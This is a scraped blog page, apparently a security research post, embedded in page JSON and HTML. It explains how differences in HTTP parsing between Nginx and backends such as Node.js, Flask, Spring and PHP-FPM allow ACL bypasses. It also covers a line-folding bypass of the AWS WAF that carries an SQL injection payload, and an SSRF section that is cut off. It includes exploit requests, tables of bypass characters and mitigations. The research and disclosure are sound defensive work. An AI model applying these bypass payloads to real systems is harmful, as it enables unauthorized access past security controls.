26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"></path></svg></a><button class="rounded-full border border-transparent py-1 font-medium text-slate-700 dark:text-slate-200 hover:bg-slate-200 disabled:opacity-50 hover:dark:bg-slate-700 flex flex-row items-center focus:outline-none px-2 text-sm" type="button" variant="transparent" data-clipboard-text=" https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies" id="text-sharer"><svg class="h-6 w-6 fill-current" viewBox="0 0 384 512"><path d="M336 64h-88.6c.4-2.6.6-5.3.6-8 0-30.9-25.1-56-56-56s-56 25.1-56 56c0 2.7.2 5.4.6 8H48C21.5 64 0 85.5 0 112v352c0 26.5 21.5 48 48 48h288c26.5 0 48-21.5 48-48V112c0-26.5-21.5-48-48-48zM192 32c13.3 0 24 10.7 24 24s-10.7 24-24 24-24-10.7-24-24 10.7-24 24-24zm160 432c0 8.8-7.2 16-16 16H48c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16h48v20c0 6.6 5.4 12 12 12h168c6.6 0 12-5.4 12-12V96h48c8.8 0 16 7.2 16 16z"></path></svg></button></div></div><div class="blog-more-articles mb-20 mt-10"><h3 class="blog-more-articles-title mb-5 text-center font-semibold uppercase tracking-wider text-slate-500 dark:text-slate-400">More articles</h3><div class="blog-more-articles-wrapper container mx-auto grid grid-flow-row grid-cols-6 px-4 xl:grid-cols-9 xl:gap-6 2xl:px-0"><div class="mb-5 px-2 dark:border-slate-800 lg:mb-0 col-span-full md:col-span-3 lg:col-span-2 xl:col-span-3"><div class="blog-similar-article-wrapper h-full rounded-lg border p-4 dark:border-slate-800"><div class="blog-similar-author-wrapper mb-3 flex flex-row items-center"><div class="flex flex-row items-center"><div class="mr-2 h-6 w-6 overflow-hidden rounded-full"><a href="https://hashnode.com/@rafax00" class="relative block h-full w-full"><span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2770%27%20height=%2770%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span><img alt="Rafael da Costa Santos&#39;s photo" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" class="blog-similar-author-photo author-photo relative z-20 block w-full rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"><noscript></noscript></span></a></div><a href="https://hashnode.com/@rafax00" class="blog-similar-author-name font-bold text-black dark:text-white">Rafael da Costa Santos</a></div></div><a href="https://rafa.hashnode.dev/influxdb-nosql-injection?source=more_articles_bottom_blogs" class="blog-similar-article-cover post-cover mb-3 block rounded border bg-cover bg-center dark:border-slate-800"><span style="box-sizing: border-box; display: block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 52.4% 0px 0px;"></span><img alt="InfluxDB NoSQL Injection" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="rounded" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"><noscript></noscript></span></a><div class="blog-post-details break-words"><h1 class="mb-2 font-heading text-2xl font-bold leading-tight tracking-tight text-slate-900 dark:text-white"><a href="https://rafa.hashnode.dev/influxdb-nosql-injection?source=more_articles_bottom_blogs">InfluxDB NoSQL Injection</a></h1><p class="text-base text-slate-700 dark:text-slate-400"><a href="https://rafa.hashnode.dev/influxdb-nosql-injection?source=more_articles_bottom_blogs">In this post, I'll share my experience of discovering a NoSQL Injection vulnerability in a Bug Bount…</a></p></div></div></div><div class="mb-5 px-2 dark:border-slate-800 lg:mb-0 col-span-full md:col-span-3 lg:col-span-2 xl:col-span-3"><div class="blog-similar-article-wrapper h-full rounded-lg border p-4 dark:border-slate-800"><div class="blog-similar-author-wrapper mb-3 flex flex-row items-center"><div class="flex flex-row items-center"><div class="mr-2 h-6 w-6 overflow-hidden rounded-full"><a href="https://hashnode.com/@rafax00" class="relative block h-full w-full"><span style="box-sizing: border-box; display: inline-block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative; max-width: 100%;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; max-width: 100%;"><img alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2770%27%20height=%2770%27/%3e" style="display: block; max-width: 100%; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px;"></span><img alt="Rafael da Costa Santos&#39;s photo" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" class="blog-similar-author-photo author-photo relative z-20 block w-full rounded-full" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"><noscript></noscript></span></a></div><a href="https://hashnode.com/@rafax00" class="blog-similar-author-name font-bold text-black dark:text-white">Rafael da Costa Santos</a></div></div><a href="https://rafa.hashnode.dev/cve-2023-32695?source=more_articles_bottom_blogs" class="blog-similar-article-cover post-cover mb-3 block rounded border bg-cover bg-center dark:border-slate-800"><span style="box-sizing: border-box; display: block; overflow: hidden; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 0px; position: relative;"><span style="box-sizing: border-box; display: block; width: initial; height: initial; background: none; opacity: 1; border: 0px; margin: 0px; padding: 52.4% 0px 0px;"></span><img alt="[CVE-2023-32695] Socket.IO DoS Trought Javascript Property Manipulation on WebSockets" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="responsive" class="rounded" style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"><noscript></noscript></span></a><div class="blog-post-details break-words"><h1 class="mb-2 font-heading text-2xl font-bold leading-tight tracking-tight text-slate-900 dark:text-white"><a href="https://rafa.hashnode.dev/cve-2023-32695?source=more_articles_bottom_blogs">[CVE-2023-32695] Socket.IO DoS Trought Javascript Property Manipulation on WebSockets</a></h1><p class="text-base text-slate-700 dark:text-slate-400"><a href="https://rafa.hashnode.dev/cve-2023-32695?source=more_articles_bottom_blogs">In this blog post, I will show a recent CVE that I discovered that exploits a Denial-of-Service (DoS…</a></p></div></div></div></div></div><div class="container relative z-20 mx-auto grid grid-flow-row grid-cols-8 xl:gap-6 2xl:grid-cols-10"><div class="blog-comments-section-wrapper col-span-8 px-4 lg:col-span-6 lg:col-start-2 lg:px-0 xl:col-span-6 xl:col-start-2 2xl:col-span-6 2xl:col-start-3"></div></div></article></main></div><footer class="blog-footer-area -mt-px border-t bg-slate-100 px-5 py-10 text-center text-slate-800 dark:border-slate-800 dark:bg-black dark:text-slate-500 md:px-10 md:py-12 lg:py-20"><div class="blog-footer-credits flex flex-col items-center justify-center"><div class="mb-12 flex flex-col flex-wrap items-center"><p class="mb-2 text-slate-600 dark:text-slate-300">©2024 Rafa's Blog</p><div class="flex flex-row flex-wrap items-center justify-center text-slate-600 dark:text-slate-300"><a class="mx-2 underline" rel="noopener" href="https://rafa.hashnode.dev/archive">Archive</a><span class="font-extrabold text-black opacity-20 dark:text-white">·</span><a href="https://hashnode.com/privacy?source=blog-footer" class="mx-2 underline">Privacy policy</a><span class="font-extrabold text-black opacity-20 dark:text-white">·</span><a class="mx-2 underline" href="https://hashnode.com/terms?source=blog-footer">Terms</a></div></div><div class="flex flex-col items-center"><a aria-label="Publish with Hashnode" class="mb-4 flex flex-row items-center rounded-lg border border-slate-300 bg-white p-3 font-heading font-bold tracking-wide text-slate-600 transition-colors duration-75 hover:border-slate-400 hover:text-slate-900 dark:border-slate-800 dark:bg-black dark:text-slate-300 dark:hover:border-slate-500 dark:hover:text-white" href="https://hashnode.com/onboard?unlock-blog=true&amp;source=blog-footer"><span class="mr-2 block text-blue-600"><svg class="h-6 w-6 fill-current" viewBox="0 0 200 200" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.742 66.824c-18.323 18.323-18.323 48.029 0 66.352l53.082 53.082c18.323 18.323 48.029 18.323 66.352 0l53.082-53.082c18.323-18.323 18.323-48.03 0-66.352l-53.082-53.082c-18.323-18.323-48.03-18.323-66.352 0L13.742 66.824zm109.481 56.399c12.826-12.826 12.826-33.62 0-46.446s-33.62-12.826-46.446 0-12.826 33.62 0 46.446 33.62 12.826 46.446 0z"></path></svg></span><span>Publish with Hashnode</span></a><p class="text-sm text-slate-600 dark:text-slate-300">Powered by <a aria-label="Hashnode" href="https://hashnode.com/?source=blog-footer" class="underline">Hashnode</a> - Home for tech writers and readers</p></div></div></footer></div></div><script type="text/javascript">
              var SUPPORTS_PASSIVE = false;
              try {
                var opts = Object.defineProperty({}, 'passive', {
                  get: function() {
                    SUPPORTS_PASSIVE = true;
                  }
                });
                window.addEventListener("testPassive", null, opts);
                window.removeEventListener("testPassive", null, opts);
              } catch (e) {}
            </script><script type="text/javascript">
              // Array.prototype.flat polyfill
              if (!Array.prototype.flat) {
                // eslint-disable-next-line no-extend-native
                Object.defineProperty(Array.prototype, 'flat', {
                  configurable: true,
                  writable: true,
                  value() {
                    // eslint-disable-next-line prefer-rest-params
                    const depth = typeof arguments[0] === 'undefined' ? 1 : Number(arguments[0]) || 0;
                    const result = [];
                    const { forEach } = result;

                    // eslint-disable-next-line no-var
                    var flatDeep = function (arr, depth) {
                      forEach.call(arr, (val) => {
                        if (depth > 0 && Array.isArray(val)) {
                          flatDeep(val, depth - 1);
                        } else {
                          result.push(val);
                        }
                      });
                    };

                    flatDeep(this, depth);
                    return result;
                  },
                });
              }
            </script><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":"{\"_id\":\"648dec85578b47894c6af863\",\"partOfPublication\":true,\"author\":{\"_id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"photo\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\",\"username\":\"rafax00\",\"bio\":\"\u003cp\u003eI'm Rafael, a Cybersecurity Analyst at SiDi with a strong focus on web applications. With a solid background in cybersecurity and a passion for uncovering vulnerabilities, I also have had the privilege of working with several Big Tech companies through Bug Bounty programs.\u003c/p\u003e\\n\",\"socialMedia\":{\"website\":\"\",\"github\":\"https://github.com/rafax00\",\"twitter\":\"\",\"facebook\":\"\",\"stackoverflow\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\"},\"isDeactivated\":false},\"bookmarkedIn\":[],\"publication\":{\"_id\":\"6488d69906c1659c6d332ff6\",\"author\":{\"_id\":\"6488d661432e5a15756c1a03\",\"name\":\"Rafael da Costa Santos\",\"photo\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686786296994/qxI_lhzL_.gif\",\"username\":\"rafax00\"},\"badgePageEnabled\":false,\"description\":\"This is my security research blog!\\n\",\"domain\":\"\",\"domainStatus\":{},\"wwwPrefixedDomainStatus\":{},\"customCSSEnabled\":false,\"customCSSPublished\":{\"homeMin\":\"\",\"postMin\":\"\",\"staticMin\":\"\"},\"customRules\":[],\"darkModeEnabled\":false,\"darkModeLogo\":\"\",\"disableFooterBranding\":false,\"isSubscriptionModalDisabled\":false,\"displayTitle\":\"\",\"favicon\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1686748925239/Z6OQdUJ0q.gif\",\"gaTrackingID\":\"\",\"hasBadges\":true,\"headerColor\":\"#0f172a\",\"hideMembersPage\":true,\"isTeam\":false,\"layout\":\"grid\",\"menu\":[{\"_id\":\"648deaa267a3e6fc49d12f9e\",\"label\":\"sponsor me\",\"priority\":0,\"type\":\"link\",\"url\":\"https://rafa.hashnode.dev/sponsor\"}],\"metaHTML\":\"\u003cp\u003eThis is my security research blog!\u003c/p\u003e\\n\",\"metaHTMLSanitized\":\"This is my security research blog!\\n\",\"newsletterEnabled\":true,\"newsletterPageEnabled\":false,\"ogImage\":\"https://cdn.hashnode.com/res/hashnode/image/upload/v1687022404075/tXTvi1WB-.gif\",\"logo\":\"\",\"textSelectionSharerEnabled\":true,\"title\":\"Rafa's Blog\",\"urlPattern\":\"simple\",\"username\":\"rafa\",\"viewCountVisible\":false,\"readTimeHidden\":true,\"links\":{\"twitter\":\"https://twitter.com/rafabyte_\",\"instagram\":\"\",\"github\":\"https://github.com/rafax00\",\"website\":\"\",\"hashnode\":\"https://hashnode.com/@rafax00\",\"youtube\":\"\",\"dailydev\":\"\",\"linkedin\":\"https://www.linkedin.com/in/rafael-da-costa-santos-9685a5172/\",\"mastodon\":\"\"},\"numPosts\":3,\"sponsorship\":{\"content\":\"\u003cp\u003eIf you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\u003c/p\u003e\\n\",\"contentMarkdown\":\"If you've found value in my blog and would like to support its continued growth, I invite you to consider becoming a sponsor. By sponsoring my blog, you can make a direct and meaningful impact on the quality and frequency of the content I provide.\"},\"stripe\":{\"connected\":true,\"accountId\":\"acct_1NK2WzIqhGEy5ZXI\",\"country\":\"BR\"},\"umamiWebsiteUUID\":\"0a9b6a2b-0d1f-4a14-a038-28d183bdfe8b\",\"allowContributorEdits\":true},\"tags\":[{\"_id\":\"56744721958ef13879b94c04\",\"slug\":\"http\",\"name\":\"http\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"5f2e70c0b8ac395b1f23a6cb\",\"slug\":\"cybersecurity-1\",\"name\":\"#cybersecurity\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"56744723958ef13879b952cb\",\"slug\":\"research\",\"name\":\"research\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"56744722958ef13879b94f40\",\"slug\":\"web\",\"name\":\"web\",\"isActive\":true,\"isApproved\":true},{\"_id\":\"6491b91ec167b41645fd218f\",\"slug\":\"desync-attacks\",\"name\":\"Desync Attacks\",\"isActive\":true,\"isApproved\":true}],\"coAuthors\":[],\"responseCount\":4,\"replyCount\":2,\"contentMarkdown\":\"The HTTP protocol plays a vital role in the seamless functioning of web applications, however, the implementation of HTTP parsers across different technologies can introduce subtle discrepancies, leading to potential security loopholes.\\n\\nIn this research, my focus revolves around the discovery of inconsistencies within HTTP parsers across various web technologies, including load balancers, reverse proxies, web servers, and caching servers. By investigating these disparities, I aim to shed light on potential new vulnerabilities that involve HTTP Desync attacks.\\n\\nIt was my first security research, I started on this journey in December 2021 and concluded in April 2022. I tried to be creative in finding new attack vectors due to incorrect HTTP parsing. In this post, I will share the final results of this study.\\n\\n# Pathname Manipulation: Bypassing Reverse Proxies and Load Balancers Security Rules\\n\\nThis section of the research focuses on the exploitable vulnerabilities arising from pathname manipulation in web servers, principally about the use of `trim()` or `strip()` functions. By exploiting these techniques, attackers can circumvent security rules specific to certain paths in reverse proxies and load balancers, posing a significant threat to web application security.\\n\\nIn this section, we delve into the intricacies of how web servers process and manipulate pathnames, investigating the impact of the removal of certain characters, which can lead to unintended behaviors.\\n\\n## Nginx ACL Rules\\n\\nNginx is a powerful web server and reverse proxy which allows developers to apply security rules on HTTP requests. This section explores security threads of the capabilities of Nginx in rewriting or blocking HTTP messages, with a primary focus on rules triggered by specific strings or regular expressions found within the HTTP pathname section.\\n\\nIn Nginx, the \\\"location\\\" rule enables developers to define specific directives and behaviors based on the requested URL. This rule acts as a key component in routing and processing incoming HTTP requests, allowing control over how different URLs are handled.\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\nThe above Nginx rule aims to deny every access to the `/admin` endpoint, so if a user tries to access this endpoint, Nginx will return `403` and will not pass the HTTP message to the web server.\\n\\nTo prevent security issues on URI-based rules, Nginx performs path normalization before checking them. Path normalization in Nginx refers to the process of transforming and standardizing requested URLs to a consistent and canonical format before handling them. It involves removing redundant or unnecessary elements from the URL path, such as extra slashes, dot segments, processing path traversal, and URL-encoded characters, to ensure uniformity and proper routing within the web server.\\n\\n## Trim Inconsistencies\\n\\nBefore we proceed, we need to understand what the `trim()` function does in different languages.\\n\\nDifferent languages remove different characters when the correspondent function for `trim()` is called. Each server will normalize the pathname based on its `trim()`, removing different characters. But Nginx which is written in C, does not cover all characters for all languages.\\n\\nE.g.: Python removes the character `\\\\x85` with `strip()`, and JavaScript does not with `trim()`.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750781066/bf6a391a-2bf5-4605-9e5e-8cc0f059a995.png align=\\\"center\\\")\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686750895455/784cf8a4-b070-4bb6-abd0-12ae887d568c.png align=\\\"center\\\")\\n\\nIf an HTTP message is parsed using the `trim()` function in different languages, an HTTP Desync attack can occur.\\n\\n## Bypassing Nginx ACL Rules With Node.js\\n\\nLet's consider the following Nginx ACL rule and Node.js API source code using Express:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```javascript\\napp.get('/admin', (req, res) =\u003e {\\n    return res.send('ADMIN');\\n});\\n```\\n\\nFollowing the `trim()` logic, Node.js \\\"ignores\\\" the characters `\\\\x09`, `\\\\xa0`, and `\\\\x0c` from the pathname, but Nginx considers them as part of the URL:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686751453300/0531fc1a-9599-4a00-aa94-21cca2db557c.png align=\\\"center\\\")\\n\\n* First, Nginx receives the HTTP request and performs path normalization on the pathname;\\n    \\n* As Nginx includes the character `\\\\xa0` as part of the pathname, the ACL rule for the `/admin` URI will not be triggered. Consequently, Nginx will forward the HTTP message to the backend;\\n    \\n* When the URI `/admin\\\\x0a` is received by the Node.js server, the character `\\\\xa0` will be removed, allowing successful retrieval of the `/admin` endpoint.\\n    \\n\\nBelow is a graphical demonstration of what happens with the HTTP request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686752151660/84ec1c49-2df9-4a44-ab01-1d798ef0564f.png align=\\\"center\\\")\\n\\nTo gain a clearer understanding of how this vulnerability can be exploited, I recommend watching the accompanying proof of concept video below:\\n\\n%[https://www.youtube.com/watch?v=sgs3s5oTfz8] \\n\\nBelow is a table correlating Nginx versions with characters that can potentially lead to bypassing URI ACL rules when using Node.js as the backend:\\n\\n| Nginx Version | **Node.js Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `\\\\xA0` |\\n| 1.21.6 | `\\\\xA0` |\\n| 1.20.2 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n| 1.18.0 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n| 1.16.1 | `\\\\xA0`, `\\\\x09`, `\\\\x0C` |\\n\\n## Bypassing Nginx ACL Rules With Flask\\n\\nFlask removes the characters `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B`, and `\\\\x09` from the URL path, but NGINX doesn't.\\n\\nTake the following nginx configuration/API source code as a reference:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```python\\n@app.route('/admin', methods = ['GET'])\\ndef admin():\\n    data = {\\\"url\\\":request.url, \\\"admin\\\":\\\"True\\\"}\\n\\n    return Response(str(data), mimetype=\\\"application/json\\\")\\n```\\n\\nAs you can see below, it's possible to circumvent the ACL protection by adding the character `\\\\x85` at the end of the pathname:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753386536/4032be9b-c7f3-48ae-8074-5d9ad1f9e7a5.png align=\\\"center\\\")\\n\\n| Nginx Version | **Flask Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `\\\\x85`, `\\\\xA0` |\\n| 1.21.6 | `\\\\x85`, `\\\\xA0` |\\n| 1.20.2 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n| 1.18.0 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n| 1.16.1 | `\\\\x85`, `\\\\xA0`, `\\\\x1F`, `\\\\x1E`, `\\\\x1D`, `\\\\x1C`, `\\\\x0C`, `\\\\x0B` |\\n\\n## Bypassing Nginx ACL Rules With Spring Boot\\n\\nSpring removes the characters `\\\\x09` and `\\\\x3B` from the URL path, but Nginx doesn't.\\n\\nTake the following Nginx configuration/API source code as a reference:\\n\\n```plaintext\\nlocation = /admin {\\n    deny all;\\n}\\n\\nlocation = /admin/ {\\n    deny all;\\n}\\n```\\n\\n```java\\n@GetMapping(\\\"/admin\\\")\\npublic String admin() {\\n    return \\\"Greetings from Spring Boot!\\\";\\n}\\n```\\n\\nBelow, you will find a demonstration of how ACL protection can be circumvented by adding the character `\\\\x09` or `\\\\t` at the end of the pathname:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686753921718/b3f91ea3-558f-4889-860c-15cdc02cb7f6.png align=\\\"center\\\")\\n\\n| Nginx Version | **Spring Boot Bypass Characters** |\\n| --- | --- |\\n| 1.22.0 | `;` |\\n| 1.21.6 | `;` |\\n| 1.20.2 | `\\\\x09`, `;` |\\n| 1.18.0 | `\\\\x09`, `;` |\\n| 1.16.1 | `\\\\x09`, `;` |\\n\\n## Bypassing Nginx ACL Rules With PHP-FPM Integration\\n\\nPHP-FPM (FastCGI Process Manager) is a robust and high-performance PHP FastCGI implementation that works seamlessly with Nginx. It serves as a standalone server for handling PHP requests, improving the speed and efficiency of PHP execution. Nginx acts as a reverse proxy, receiving incoming HTTP requests and passing them to PHP-FPM for processing.\\n\\nLet's consider the following Nginx FPM configuration:\\n\\n```plaintext\\nlocation = /admin.php {\\n    deny all;\\n}\\n\\nlocation ~ \\\\.php$ {\\n    include snippets/fastcgi-php.conf;\\n    fastcgi_pass unix:/run/php/php8.1-fpm.sock;\\n}\\n```\\n\\nWhen two `.php` files are in the same pathname of the HTTP request, PHP will match the first one, ignoring everything after the slash. Since the Nginx is configured to block requests to the specific endpoint `/admin.php`, it's possible to access the admin.php file by doing the following request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758750001/66ac562a-7da9-4397-a76a-1d641474e000.png align=\\\"center\\\")\\n\\nBelow is a graphical example of how the applications interpret the HTTP request:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758967146/03073365-9dbf-4cf5-8762-1d705c9a038c.png align=\\\"center\\\")\\n\\nThis technique only works if the second PHP file, in this case, `index.php`, exists in the server structure. Take the following server code/structure as a reference:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686758832956/d0708099-48e0-46d0-b646-8bb92c51454a.png align=\\\"center\\\")\\n\\nThese behaviors were reported to the Nginx security team in 2022, and they responded by saying that they don't have responsibility for it.\\n\\nSince the research concluded in April 2022, newer versions of Nginx were not specifically tested. However, it is highly likely that the findings and vulnerabilities identified in the research are reproducible in the latest version of Nginx as well.\\n\\n## How to prevent\\n\\nTo prevent these issues, you must use the `~` expression Instead of the `=` expression on Nginx ACL rules, for example:\\n\\n```plaintext\\nlocation ~* ^/admin {\\n    deny all;\\n}\\n```\\n\\nThe `~` expression matches the string `/admin` in any part of the pathname, in other words, if a user sent a request to `/admin1337`, the request will also be blocked.\\n\\n# Bypassing AWS WAF ACL\\n\\n## How AWS WAF ACLs Work\\n\\nAWS ACL (Access Control List) rules are a component of load balancers, providing control over incoming and outgoing network traffic. These rules define access permissions based on specified conditions, allowing or denying requests to and from the load balancer.\\n\\nYou can configure the AWS Web Application Firewall (WAF) ACL to examine and validate HTTP headers. AWS WAF ACL rules allow you to define conditions based on specific header attributes or values, enabling you to control and filter incoming requests.\\n\\nHeader ACL example:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686762641000/8f9c4e41-c17a-48d6-b2f5-72d76217e337.png align=\\\"center\\\")\\n\\nIn the above example, if a request contains a SQL Injection payload in the `X-Query` header, AWS WAF recognizes the SQL Injection attempt and responds with a `403 Forbidden` HTTP status code. This prevents the request from being forwarded to the backend, effectively blocking any potential exploitation of the application's database through SQL Injection attacks.\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686763561032/d592bd74-2618-461d-9768-314549b691cf.png align=\\\"center\\\")\\n\\nAs you can see, the above request carried the payload `' or '1'='1' --` at the `X-Query` header, and then was blocked by the AWS WAF.\\n\\n## Bypassing AWS WAF ACL With Line Folding\\n\\nWeb servers like Node.js, Flask and many others sometimes encounter a phenomenon known as \\\"line folding.\\\" Line folding refers to the practice of splitting long header values using the characters \\\\\\\\x09 (tab) and \\\\\\\\x20 (space) into multiple lines for readability. However, this behavior can lead to compatibility issues and potential security vulnerabilities.\\n\\nFor example, the header `1337: Value\\\\r\\\\n\\\\t1337` in the following request will be interpreted as `1337: Value\\\\t1337` in the Node.js server:\\n\\n```http\\nGET / HTTP/1.1\\nHost: target.com\\n1337: Value\\n    1337\\nConnection: close\\n```\\n\\nKnowing it, I discovered that it's possible to bypass the AWS WAF by using line folding behavior.\\n\\nUsing the same AWS WAF that protects the `X-Query` from SQL Injection payloads, the following HTTP request was used to confirm that the Node.js server received the payload `' or '1'='1' --` in the `X-Query` header.\\n\\nBelow is a graphical example of how the applications interpret the HTTP request header with line folding:\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765599948/440f51b0-18bb-451c-92da-3428000cd7f0.png align=\\\"center\\\")\\n\\nFor the exploitation scenario, let's take the following Node.js source code as a reference. It will return the requested headers as a Json:\\n\\n```javascript\\napp.get('/*', (req, res) =\u003e {\\n    res.send(req.headers);\\n});\\n```\\n\\nBelow is an example of an exploitation request:\\n\\n```http\\nGET / HTTP/1.1\\\\r\\\\n\\nHost: target.com\\\\r\\\\n\\nX-Query: Value\\\\r\\\\n\\n\\\\t' or '1'='1' -- \\\\r\\\\n\\nConnection: close\\\\r\\\\n\\n\\\\r\\\\n\\n```\\n\\n![](https://cdn.hashnode.com/res/hashnode/image/upload/v1686765362775/dbd69c56-503e-45bb-ada6-358d3d987ede.png align=\\\"center\\\")\\n\\nIn the provided screenshot, it is evident that the Node.js application interpreted the characters `' or '1'='1' --` as the value for the `X-Query` header. However, the AWS WAF treated it as a header name instead.\\n\\nThis bypass technique was reported to the AWS security team and fixed in 2022.\\n\\n# Incorrect Path Parsing Leads to Server-Side Request Forgery\\n\\nIn the previous sections, I provided reasons to be cautious about trusting reverse proxies. However, in this section, I will demonstrate why utilizing a reverse proxy can be advantageous...\\n\\nIn this section, I will leverage an incorrect pathname interpretation to exploit a Server-Side Request Forgery vulnerability in popular servers and frameworks such as Spring Boot, Flask, and PHP.\\n\\nNormally, a valid HTTP pathname starts with `/` or `http(s)://domain/`, but the majority of the popular WEB servers do not verify it correctly, which can lead to a security risk.\\n\\n## SSRF on Flask Through Incorrect Pathname Interpretation\\n\\nFlask is a lightweight web framework for Python, and it offers a straightforward and flexible approach to web development.\\n\\nAfter conducting tests on Flask's pathname parsing, I discovered that it accepts certain characters that it shouldn't. As an example, the following HTTP request, which should be considered invalid, is surprisingly treated as valid by the framework, but the server responds `404 Not Found`:\\n\\n```http\\nGET @/ HTTP/1.1\\nHost: target.com\\nConnection: close\\n```\\n\\nWhile investigating how this behavior can potentially result in a security vulnerability, I came across a helpful [Medium blog post](https://medium.com/@zwork101/making-a-flask-proxy-server-online-in-10-lines-of-code-44b8721bca6) that demonstrates the creation of a proxy using the Flask framework. Below is an example of the code provided in the blog post:\\n\\n```python\\nfrom flask import Flask\\nfrom requests import get\\n\\napp = Flask('__main__')\\nSITE_NAME = 'https://google.com/'\\n\\n@app.route('/', defaults={'path': ''})\\n@app.route('/\u003cpath:path\u003e')\\ndef 